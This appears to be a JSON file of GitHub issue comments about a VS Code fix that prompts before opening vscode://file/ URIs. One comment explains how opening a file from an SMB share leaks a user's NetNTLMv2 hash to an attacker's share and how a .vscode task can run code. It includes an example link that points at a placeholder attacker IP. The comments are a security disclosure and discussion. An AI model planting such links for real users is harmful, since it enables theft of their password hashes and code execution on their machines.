@@ -1,0 +1,50 @@
+{
+  "comments":[
+    {
+      "comment":"In order to eliminate security concerns on Windows, VS Code will now ask the user for permission before opening a URI of the form `vscode://file/<path>`.\r\n\r\nCredits go to Abdel Adim 'smaury' Oisfi of https://www.shielder.it.",
+      "user":"Tyriar"
+    },
+    {
+      "comment":"> VS Code will not ask\r\n\r\nI guess this is a typo, and should say \"now\"?",
+      "user":"DanTup"
+    },
+    {
+      "comment":"What is the security concern ? Opening a file using vscode can lead to code execution ?\r\n",
+      "user":"softlion"
+    },
+    {
+      "comment":"@softlion \r\nWindows can open files hosted on SMB shares.\r\nBy default if a SMB share link is opened Windows sends the `NetNTLMv2` of the logged-in user, which is basically your `DOMAIN\\username:hash_of_password`. [1]\r\nIf you send those information to an attacker-controlled SMB share she could crack your password.\r\nMoreover, hosting on the SMB share a custom task in the `.vscode` directory could allow the attacker to execute arbitrary code on the victim's client while running that task.\r\n\r\nConsidering the fact that `vscode` URIs can be opened through a browser (`<a href=\"vscode://file/\\<attacker-ip>\\<share>\\<path>\">click me!</a>`) it's a good idea to prompt the user what's happening before sharing her hashes 😉\r\n\r\n[1] https://github.com/SpiderLabs/Responder\r\n",
+      "user":"smaury"
+    },
+    {
+      "comment":"This is what happens when you hire a bunch of SJW to write your code. ",
+      "user":"mahen23"
+    },
+    {
+      "comment":"> @softlion\r\n> Windows can open files hosted on SMB shares.\r\n> By default if a SMB share link is opened Windows sends the `NetNTLMv2` of the logged-in user, which is basically your `DOMAIN\\username:hash_of_password`. [1]\r\n> If you send those information to an attacker-controlled SMB share she could crack your password.\r\n> Moreover, hosting on the SMB share a custom task in the `.vscode` directory could allow the attacker to execute arbitrary code on the victim's client while running that task.\r\n> \r\n> Considering the fact that `vscode` URIs can be opened through a browser (`<a href=\"vscode://file/\\<attacker-ip>\\<share>\\<path>\">click me!</a>`) it's a good idea to prompt the user what's happening before sharing her hashes \r\n> \r\n> [1] https://github.com/SpiderLabs/Responder\r\n\r\nWait, so opening an untrusted directory in vscode can lead to arbitrary code execution on my machine? (by having a malicious .vscode directory)",
+      "user":"cristi8"
+    },
+    {
+      "comment":"> Wait, so opening an untrusted directory in vscode can lead to arbitrary code execution on my machine? (by having a malicious .vscode directory)\r\n\r\nYes, but requires user interaction:\r\n1. You must open the untrusted project\r\n2. You must run a task\r\n\r\nThis is possible because VS Code allows to specify a `shell` command as task [1], but in my opinion is more likely a feature than a security issue, that's why I didn't even report it 🤷🏾‍♂️\r\n\r\n@Tyriar can probably argue more on the design choice.\r\n\r\n[1] https://code.visualstudio.com/docs/editor/tasks",
+      "user":"smaury"
+    },
+    {
+      "comment":"How about giving the option to disable this prompt through settings?\r\nWhen this action is frequent the extra click on \"Yes\" becomes annoying :(",
+      "user":"DifficultNick"
+    },
+    {
+      "comment":"> @Tyriar can probably argue more on the design choice.\r\n\r\nI didn't actually make this fix, I was just one of the [endgame masters](https://github.com/microsoft/vscode/wiki/Running-the-Endgame) for the month. Follow https://github.com/microsoft/vscode/issues/95670 for an answer on the UX side, normally we opt for the safer side though. ",
+      "user":"Tyriar"
+    },
+    {
+      "comment":"I have a situation where this is forcing me to answer the question twice.  I have an internal tool that generates an HTML page shown in Chrome with links similar to the one below.  The link  points to the line number, column and file that is opened when I click on the link to the code from HTML page that I display through Chrome.  Back when I built the tool, I spent a quite a while trying to stop Chrome from prompting me each time I open the file but just learned to live with it.  Now that this has been added to VSCode, anytime I try to open an html link from Chrome to VSCode I am prompted once by Chrome and then a second time by VSCode.   I wish both programs had an option to allow bypass without confirmation but it now appears that links like  ```<a href='vscode://file/D:\\OSPOS5\\Shared\\Build\\Settings.Build.props:13:5'>.\\Shared\\Build\\Settings.Build.props</a>``` are of little value now.  I appreciate the security concerns but we are all advanced developers who should be able to bypass impractical annoyances like this.  Can we please have a setting for this?",
+      "user":"jtbrower"
+    },
+    {
+      "comment":"@jtbrower please comment on https://github.com/microsoft/vscode/issues/95670 regarding UX problems with this fix.",
+      "user":"Tyriar"
+    }
+  ],
+  "repository":"vscode",
+  "user":"Tyriar"
+}
